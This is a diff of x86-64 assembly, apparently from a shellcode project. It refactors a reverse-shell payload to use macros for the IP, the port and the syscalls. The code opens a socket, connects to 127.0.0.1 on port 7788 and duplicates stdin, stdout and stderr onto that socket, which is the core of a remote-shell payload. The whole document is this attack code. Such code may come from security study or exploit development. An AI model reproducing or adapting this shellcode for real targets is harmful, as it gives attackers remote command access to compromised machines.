@@ -5,9 +5,11 @@
 	;; port is littleEndian
 %include "short64.s"
 %include "syscall.s"
+%include "util.s"
+
 	
-%define IP  		0x0100007f	;IP 127.0.0.1 Little Endian
-%define PORT		0x6c1e		;port 7788 Little Endian
+%define IP  		ip(127,0,0,1)
+%define PORT		htons(7788)		;port 7788 Little Endian
 %define AF_INET 	2
 %define SOCK_STREAM	1
 %define ANY_PROTO	0
@@ -22,16 +24,14 @@ BITS 64
 main:
 	
 open_my_socket:
-	push byte socket
-	pop rax
-	push byte 2
+	push byte AF_INET
 	pop  rdi
-	push byte 1
+	push byte SOCK_STREAM
 	pop rsi
-	push byte 0
+	push byte ANY_PROTO
 	pop rdx
-	SYSTEM_CALL
-	;; rax has socket
+	SYSTEM_CALL(socket)
+
 	xchg rax,rdi
 make_sockaddr:
 	push byte 0		;lame part of sockaddr
@@ -42,19 +42,14 @@ make_sockaddr:
 	push 0x10
 	pop rdx			;addrlen
 	;RDI=sockfd
-	push connect
-	pop rax
-	SYSTEM_CALL
+	SYSTEM_CALL(connect)
 	;; assume success (RAX=0)
 	
 	
-	push byte 2
+	push byte 2		;loop count and FD#
 	pop rsi
 copy_stdin_out_err:
-	push byte dup2
-	pop rax
-	SYSTEM_CALL
-	
+	SYSTEM_CALL(dup2)	
 	dec rsi
 	jns copy_stdin_out_err
 	
